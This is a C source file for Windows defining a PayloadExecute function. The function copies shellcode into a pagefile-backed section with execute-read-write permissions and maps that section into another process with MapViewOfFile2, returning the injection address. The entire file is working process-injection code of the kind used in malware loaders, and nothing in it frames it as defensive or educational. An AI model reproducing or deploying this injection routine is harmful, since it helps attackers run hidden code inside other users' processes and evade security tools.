#pragma comment(lib, "Onecore.lib")
#pragma once
#pragma comment(lib, "Onecoreuap.lib")
#include <Windows.h>
#include <stdio.h>
#include <memoryapi.h>
#include "api.h"

BOOL PayloadExecute(IN HANDLE hProcess, IN OPTIONAL HANDLE hThread, IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread) {

	HANDLE		hMappingFile			= NULL;
	PBYTE		pLocalMappingAddress	= NULL,
				pRemoteMappingAddress	= NULL;

	if (!hProcess || !pShellcodeAddress || !sShellcodeSize || !ppInjectionAddress)
		return FALSE;

	if (!(hMappingFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0x00, sShellcodeSize, NULL))) {
		printf("[!] CreateFileMappingW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pLocalMappingAddress = (PBYTE)MapViewOfFile(hMappingFile, FILE_MAP_WRITE, 0x00, 0x00, sShellcodeSize))) {
		printf("[!] MapViewOfFile Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	memcpy(pLocalMappingAddress, pShellcodeAddress, sShellcodeSize);

	if (!(pRemoteMappingAddress = MapViewOfFile2(hMappingFile, hProcess, 0x00, NULL, 0x00, 0x00, PAGE_EXECUTE_READWRITE))) {
		printf("[!] MapViewOfFileEx Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	*ppInjectionAddress = pRemoteMappingAddress;

_END_OF_FUNC:
	if (hMappingFile)
		CloseHandle(hMappingFile);
	return (*ppInjectionAddress) ? TRUE : FALSE;
}
